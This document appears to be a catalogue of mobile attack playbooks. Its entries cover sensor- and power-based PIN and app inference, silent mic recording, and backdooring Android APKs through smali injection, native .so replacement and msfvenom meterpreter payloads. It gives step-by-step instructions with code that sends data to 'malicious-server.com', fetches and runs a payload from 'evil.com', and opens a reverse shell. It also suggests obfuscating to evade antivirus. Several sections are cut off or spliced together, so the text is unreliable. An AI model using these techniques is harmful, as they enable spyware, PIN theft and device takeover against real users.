- **Impact**: App usage profiling, app fingerprinting, privacy loss
- **Tools**: Modified USB power meter (e.g., USB Doctor), Arduino/Teensy, Oscilloscope, Python (NumPy, SciPy), Android Debug Bridge (ADB), Malicious charging port
- **Scenario**: Attacker uses side-channel data such as voltage or power fluctuations from mobile charging ports or external monitors to infer what apps are being used (e.g., messaging, banking). Each app has a unique power signature. If a malicious charging station or USB port is compromised, it can silently monitor and record usage behavior.
- **Attack Steps**: 1. Set up a malicious charging port (public USB hub or charging station) connected to a microcontroller like Teensy/Arduino that records voltage/current at high resolution. 2. Use USB Doctor or build a custom USB inline meter with voltage/current monitoring. 3. Connect target mobile phone via USB to this station. 4. Start logging power consumption at microsecond intervals while the user interacts with the phone. 5. Analyze power traces using Python (NumPy, Pandas, Matplotlib) to find recurring patterns. 6. Use machine learning (e.g., SVM, Random Forest) trained on app-specific power signatures (WhatsApp, Instagram, GPay, etc.) 7. Infer which app was used based on timing, spikes, and background activity. 8. If combined with ADB (in unlocked/debug mode), further app interaction data may be collected.
- **Detection**: Unusual USB behavior, voltage monitoring tools
- **Solution**: Block data access on USB by default, use trusted chargers, disable developer mode
- **Tags**: Power Analysis, Charging Port Attack, Side-Channel, Mobile Privacy

## TapLogger Attack (Touchscreen Tap via Accelerometer)

- **Attack Type**: Sensor-Based Keystroke Logging
- **Target**: Mobile Phones (Android)
- **Vulnerability**: Unrestricted sensor access, lack of user awareness
- **MITRE**: T1410 (Input Capture), T1412 (Sensor Data Capture)
- **Impact**: PIN/password inference, keylogging without permissions

- **Scenario**: TapLogger-style attacks leverage unprotected access to motion sensors (accelerometer) to infer screen taps or keyboard input. Since mobile OSs often do not require permissions for accelerometer access, a background app can passively record tap events. Using ML, attackers infer tap positions and entered text.

Publish this app disguised as a utility app (e.g., battery saver) or side-load it. 3. When user interacts with device (tapping PINs, passwords, etc.), the app records sensor changes for each tap. 4. The sensor data is timestamped and sent to remote attacker-controlled server or stored locally. 5. Use Python with ML libraries (TensorFlow/Keras) to train a model to detect tap locations and infer likely key presses (based on device orientation and known keyboard layout). 6. Analyze and reconstruct entered text like PIN, password, or chat messages. 7. Optionally combine with screen state info (via ADB or logcat) for higher accuracy.

Deploy it on the target device (side-loaded or via fake app store/phishing). 3. Log data at 100–200 Hz to maximize temporal resolution. 4. Align sensor readings with screen touches and screen orientation. 5. Export collected logs to CSV for offline processing. 6. Train an LSTM-based neural network model (TensorFlow/Keras) on known typing samples using the same device layout. 7. Use this model to classify unknown inputs (passwords, typed content) from recorded sensor logs. 8. Optionally correlate gyroscope roll/pitch changes with screen keyboard zones (left vs. right keys) for improved precision.

## PIN Skimming via Motion+Audio Sensors (PIN Skimmer)

- **Scenario**: In this attack, a malicious app running in the background uses motion (accelerometer/gyroscope) and audio (microphone) sensors to detect vibrations, device tilt, and tap sounds. These side-channel signals are used to infer the numeric PIN entered on a touchscreen keypad. Because many mobile OSs (especially Android) do not require permissions for sensor access, this attack can run silently without alerting the user.

Develop a Background Android App: – Open Android Studio. – Create a new project with no UI. – In MainActivity.java, register listeners for: • Accelerometer: Sensor.TYPE_ACCELEROMETER • Gyroscope: Sensor.TYPE_GYROSCOPE – Use SensorManager.registerListener() with a high sampling rate.2. Add Microphone Monitoring: – Use MediaRecorder to start audio capture. – Do not store full audio — just compute amplitude spikes in real-time. – Use getMaxAmplitude() to log peak tap sounds when a key is pressed.3. Log Timestamped Data: – For each tap: record accelerometer x/y/z, gyroscope x/y/z, and audio amplitude. – Save to local CSV file (or remote server if simulating a real attack).4. Collect Training Data (Safe Simulation): – On the same device, simulate entering known PINs (like 1234, 5678, 4321). – Press keys naturally while logging sensor + sound data. – Record 50–100 samples per PIN to build a dataset.5. Preprocess the Dataset: – Use Python and Pandas to read sensor CSV. – Normalize values (standard scaling). – Split each entry into time-series windows per tap.6. Train ML Model to Predict Digits: – Use TensorFlow/Keras to build an LSTM model: • Inputs: Accelerometer, gyroscope, amplitude over time. • Output: PIN digit (0–9). – Train for ~50 epochs until accuracy reaches 70–80%+.7. Run in Real-Time (Attack Simulation): – Let app run silently in background. – When user unlocks phone or enters banking PIN, log data as before. – Feed live logs into the ML model. – Predict the likely PIN sequence.8. (Optional) Exfiltrate PIN: – Use Firebase or HTTP POST to send predicted PIN to attacker-controlled server. – Or, keep it local if testing in emulator/sandbox.9. (Advanced): Combine with GUI Overlay to trigger when user is on lock screen or banking app (requires AccessibilityService or overlay permission).
- **Detection**: Monitor battery usage, unusual sensor/mic activity, anomaly in background apps

## App Usage Fingerprinting via CPU Frequency and Power

- **Attack Type**: Side-Channel Monitoring via System Stats
- **Target**: Android Devices
- **Vulnerability**: Exposed CPU/power interfaces, background monitoring allowed
- **MITRE**: T1512 (Side Channel via Device State), T1082 (System Info Discovery)
- **Impact**: User privacy breach, profiling app behavior
- **Tools**: Android SDK, Custom App, adb, Python (Pandas, Scikit-learn), Logcat
- **Scenario**: A malicious background app continuously reads system files such as /sys/devices/system/cpu/ and /sys/class/power_supply/ to infer which app is running based on CPU frequency shifts and battery usage patterns. Apps like YouTube, WhatsApp, and Chrome create distinct CPU/power signatures that can be fingerprinted.
- **Attack Steps**: 1. Build a background Android app (no UI needed). 2. Request permission for reading system status (battery stats, CPU info). 3. In your Java/Kotlin code, read from: /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq /sys/class/power_supply/battery/current_now and voltage_now 4. Log this data every 1–2 seconds and write to a local file or exfiltrate. 5. Simulate known app usage (e.g., open WhatsApp for 60 sec, YouTube for 60 sec) and collect baseline data. 6. Train a machine learning classifier (e.g., Random Forest) using Pandas + Scikit-learn on this dataset. 7. Deploy trained model into app to monitor patterns in real time. 8. Based on power/CPU fingerprint, infer what app is running silently in the background. 9. Optionally send the prediction to attacker’s server.
- **Detection**: Monitor frequent reads of /sys/, unexpected CPU polling
- **Solution**: Restrict access to CPU/power stats, OS-level API controls, background access auditing
- **Tags**: CPU Fingerprinting, App Inference, Android Side Channel, Power Profiling

## Browser Fingerprinting via Power Drain (JS-based)

Collect this data into browser fingerprint along with: • User-Agent • Screen resolution • AudioContext fingerprint • Canvas fingerprint 7. Create a Malicious Android App with Microphone Access: – Open Android Studio and create a new app. – Add microphone permission in AndroidManifest.xml: android.permission.RECORD_AUDIO – Use MediaRecorder or AudioRecord API to capture raw .wav or .pcm audio.2. Set Up Silent Background Recording: – Start recording as soon as the app launches. – Ensure no notification is shown (on older Android versions this was possible). – Save raw audio data in background, chunked into 10–30 second intervals.3. Place Device on Flat Surface (Lab Simulation): – Place test phone on wooden or metal desk. – Near the device, speak or tap (simulate password typing or conversations).4. For Testing: Use Audacity to visualize vibrations; you’ll see spikes at tap/speech points.Important: This can be tested on your own device for safe experimentation.Real-world Research: MIT and Berkeley researchers showed that phone mics can reconstruct speech from glass vibrations (e.g., from 1–2m away in certain conditions).

## Injecting Malicious Code via smali

- **Attack Type**: Static Code Injection via App Repackaging
- **Target**: Android APKs
- **Vulnerability**: No integrity checks, no Play Store validation, OS trusts signed APKs
- **MITRE**: T1398 (Application Layer Protocol), T1406 (Code Injection), T1391 (App Modification)
- **Impact**: Malicious backdoors, data theft, spyware installation
- **Tools**: apktool, smali/baksmali, keytool, jarsigner, zipalign, Android Studio, VirusTotal (for testing), Android Emulator
- **Scenario**: In this attack, a malicious actor decompiles a legitimate Android APK file, injects custom smali (assembly-like) code for malicious actions (e.g., stealing SMS, logging keystrokes, C2 communication), and repackages it to look exactly like the original app. This cloned app can be uploaded to third-party app stores or shared via phishing links.
- **Attack Steps**: 1. Install Required Tools: – Install Java JDK, apktool, smali/baksmali, keytool, zipalign, jarsigner.2. Get Target APK: – Download the original APK (e.g., com.example.app.apk) from APKMirror or other sources.3. Decompile the APK using apktool: apktool d com.example.app.apk -o DecompiledApp – This creates a folder with all the .smali files and resources.4. Inject Malicious Code in smali: – Navigate to the .smali file of the main Activity (e.g., MainActivity.smali). – Locate the onCreate method: .method public onCreate(Landroid/os/Bundle;)V – Insert malicious code before return-void. Example: smali<br> const-string v0, "http://malicious-server.com/steal"<br> invoke-static {v0}, Lcom/example/malicious/Exfiltrate;->send(Ljava/lang/String;)V<br>  – You can write custom smali methods under a new folder like /smali/com/example/malicious/Exfiltrate.smali to handle network communication.5. Rebuild the Modified App: apktool b DecompiledApp -o ClonedMaliciousApp.apk6. Sign the APK: – Generate a keystore: keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 – Sign the APK: jarsigner -verbose -keystore my-release-key.keystore ClonedMaliciousApp.apk alias_name7. Align the APK (Optional but recommended): zipalign -v 4 ClonedMaliciousApp.apk FinalMaliciousApp.apk8. Install the Repackaged App on Emulator or Test Phone: – Use adb install FinalMaliciousApp.apk – Run the app and verify malicious code executes (e.g., logs to remote server, prints toast, steals device info).9. (Optional) Upload to VirusTotal to verify detection status. – If detection rate is low, attacker can obfuscate further using tools like ProGuard or DexGuard.10. Spread the App (Real Attackers Do This) – Upload to third-party stores, phishing sites, or send via social media.✅ This entire process is legally and ethically safe only when performed on your own apps or in isolated test environments (emulator or test phone). Never distribute repackaged apps.
- **Detection**: Signature mismatch, behavior anomaly detection, antivirus alerts
- **Solution**: Use Play Store, verify certificate hashes, enable Google Play Protect, analyze app signature
- **Tags**: App Cloning, smali Injection, Reverse Engineering, Mobile Malware

## Replacing Native Libraries (.so)

- **Attack Type**: Native Library Code Injection
- **Target**: Android Apps with Native Code
- **Vulnerability**: Unsigned or unverified .so libraries, JNI abuse
- **MITRE**: T1416 (Repackaging), T1546.001 (Event Triggered Execution: Native Code), T1406 (Code Injection)
- **Impact**: Native-level code execution, full device compromise
- **Tools**: apktool, ndk-build, C/C++ compiler (gcc, clang), objdump, adb, Android Emulator, Frida (optional)
- **Scenario**: Many Android apps use .so libraries (native C/C++ shared objects) for performance or security. Attackers can replace these .so files in an APK with malicious ones. Once repackaged and signed, the app runs with the attacker's native code (e.g., for keylogging, command execution, backdoors), while appearing normal.
- **Attack Steps**: 1. Get Target APK: – Download app using .so files (check lib/armeabi-v7a/*.so inside the APK).2. Decompile APK: apktool d target.apk -o target_folder3. Analyze Native Libraries: – Use objdump -x libtarget.so to understand exported functions. – Identify which function is used for critical tasks (e.g., login, network).4. Write Malicious Replacement in C/C++: – Create a .c file with a function of the same name: c<br> JNIEXPORT void JNICALL Java_com_example_Target_nativeLogin(JNIEnv* env, jobject obj) {<br> system("wget http://evil.com/payload.sh -O /sdcard/run.sh");<br> system("sh /sdcard/run.sh");<br> }<br>  – Compile using Android NDK: ndk-build → generates libtarget.so5. Replace Original .so File: – Copy new .so into target_folder/lib/armeabi-v7a/ replacing original.6. Rebuild the APK: apktool b target_folder -o evil.apk7. Sign the APK: – Use jarsigner and keytool to sign the APK.8. Install and Test: – Use adb install evil.apk – Run app. On triggering the native function, it will now execute your code.✅ This method completely bypasses Java-level detection since it operates at native level.Real Use: Android spyware often loads .so payloads dynamically.
- **Detection**: Monitor native function changes, verify .so hash, check for tampering
- **Solution**: Enforce .so signature checks, use Play Store verified libraries, binary integrity checks
- **Tags**: Native Code Injection, .so Replacement, Repackaged APKs, Android Malware

Generate Reverse Shell APK with msfvenom (for payload only): bash<br> msfvenom -p android/meterpreter/reverse_tcp LHOST=<your IP> LPORT=4444 -o shell.apk<br> 3. Decompile Both APKs: - Decompile target app: apktool d original.apk -o original_app - Decompile reverse shell APK: apktool d shell.apk -o payload_app4. Rebuild APK: apktool b original_app -o backdoored.apk7. Sign APK: - Generate keystore: bash<br> keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000<br>  - Sign APK: bash<br> jarsigner -verbose -keystore test.keystore backdoored.apk test<br> 8. Attacker Now Has Control: - View files: ls, cd, download, upload - Record mic/camera: record_mic, webcam_snap - Read SMS, contacts: dump_sms, dump_contacts✅ Warning: For ethical learning only. Never distribute or test on real devices/users. This technique is used by malware in real-world Android APT campaigns.
